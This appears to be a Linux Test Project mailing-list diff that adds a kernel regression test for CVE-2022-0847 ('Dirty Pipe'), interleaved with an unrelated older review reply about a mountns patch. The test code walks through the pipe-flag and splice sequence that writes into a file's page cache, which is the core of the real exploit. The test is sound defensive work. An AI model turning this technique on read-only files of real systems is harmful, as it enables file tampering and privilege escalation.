++		tst_brk(TFAIL, "Sorry, cannot enlarget the file");
++
++	/*
++	 * create the pipe with all flags initialized with
++	 * PIPE_BUF_FLAG_CAN_MERGE
++	 */
++	prepare_pipe();
++
++	/*
++	 * splice one byte from before the specified offset into the pipe;
++	 * this will add a reference to the page cache, but since
++	 * copy_page_to_iter_pipe() does not initialize the "flags",
++	 * PIPE_BUF_FLAG_CAN_MERGE is still set
++	 */
++	--offset;
++	nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
++	if (nbytes < 0)
++		tst_brk(TFAIL, "splice failed");
++	if (nbytes == 0)
++		tst_brk(TFAIL, "short splice");
++
++	/*
++	 * the following write will not create a new pipe_buffer, but
++	 * will instead write into the page cache, because of the
++	 *  PIPE_BUF_FLAG_CAN_MERGE flag
++	 */
++	len = SAFE_WRITE(1, p[1], TEXT, data_size);
++	if (len < nbytes)
++		tst_brk(TFAIL, "short write");
++
++	check_file_contents();
++	SAFE_CLOSE(p[0]);
++	SAFE_CLOSE(p[1]);
++	SAFE_CLOSE(fd);
++}
++
++static void setup(void)
++{
++	memset(write_buf, 0xff, 4096);
++
++	page_size = SAFE_SYSCONF(_SC_PAGESIZE);
++
++	/*write 4k 0xff to file*/
++	tst_fill_file(TESTFILE, 0xff, CHUNK, BUFSIZE / CHUNK);
++}
++
++static void cleanup(void)
++{
++	if (p[0] > -1)
++		SAFE_CLOSE(p[0]);
++	if (p[1] > -1)
++		SAFE_CLOSE(p[1]);
++	if (fd > -1)
++		SAFE_CLOSE(fd);
++}
++
++static struct tst_test test = {
++	.setup = setup,
++	.cleanup = cleanup,
++	.test_all = run,
++	.needs_tmpdir = 1,
++	.bufs = (struct tst_buffers []) {
++		{&write_buf, .size = 4096},
++		{&read_buf, .size = 4096},
++		{},
++	},
++	.tags = (const struct tst_tag[]) {
++		{"linux-git", "9d2231c5d74e"},
++		{"CVE", "CVE-2022-0847"},
++		{},
++	}
++};
+-- 
+2.27.0
 
-So
-Reviewed-by: Yang Xu <xuyang2018.jy@fujitsu.com>
-
-ps: mountns04 seems doesn't need to use needs_checkpoints member
-because we don't use tst_checkpoint* api in there.
-
-Best Regards
-Yang Xu
-> To get rid of race condition (occurs with umount_folders):
->
->      mountns01.c:42: TPASS: shared mount in parent passed
->      mountns01.c:83: TPASS: shared mount in child passed
->      tst_device.c:394: TWARN: umount('B') failed with EINVAL
->      mountns.h:39: TWARN: umount(B) failed: EINVAL (22)
->
-> Signed-off-by: Li Wang<liwang@redhat.com>
-> ---
->   testcases/kernel/containers/mountns/mountns01.c | 2 ++
->   testcases/kernel/containers/mountns/mountns02.c | 2 ++
->   testcases/kernel/containers/mountns/mountns03.c | 2 ++
->   3 files changed, 6 insertions(+)
->
-> diff --git a/testcases/kernel/containers/mountns/mountns01.c b/testcases/kernel/containers/mountns/mountns01.c
-> index 452fe1d10..3e9c22ce3 100644
-> --- a/testcases/kernel/containers/mountns/mountns01.c
-> +++ b/testcases/kernel/containers/mountns/mountns01.c
-> @@ -86,6 +86,8 @@ static void run(void)
->
->   	TST_CHECKPOINT_WAKE(0);
->
-> +	SAFE_WAIT(NULL);
-> +
->   	SAFE_UMOUNT(DIRA);
->   }
->
-> diff --git a/testcases/kernel/containers/mountns/mountns02.c b/testcases/kernel/containers/mountns/mountns02.c
-> index cbd435958..4ef1a61b8 100644
-> --- a/testcases/kernel/containers/mountns/mountns02.c
-> +++ b/testcases/kernel/containers/mountns/mountns02.c
-> @@ -87,6 +87,8 @@ static void run(void)
->
->   	TST_CHECKPOINT_WAKE(0);
->
-> +	SAFE_WAIT(NULL);
-> +
->   	SAFE_UMOUNT(DIRA);
->   }
->
-> diff --git a/testcases/kernel/containers/mountns/mountns03.c b/testcases/kernel/containers/mountns/mountns03.c
-> index 5c19a96a9..0d8b86f9d 100644
-> --- a/testcases/kernel/containers/mountns/mountns03.c
-> +++ b/testcases/kernel/containers/mountns/mountns03.c
-> @@ -97,6 +97,8 @@ static void run(void)
->
->   	TST_CHECKPOINT_WAKE(0);
->
-> +	SAFE_WAIT(NULL);
-> +
->   	SAFE_UMOUNT(DIRA);
->   }
->
 
 -- 
 Mailing list info: https://lists.linux.it/listinfo/ltp
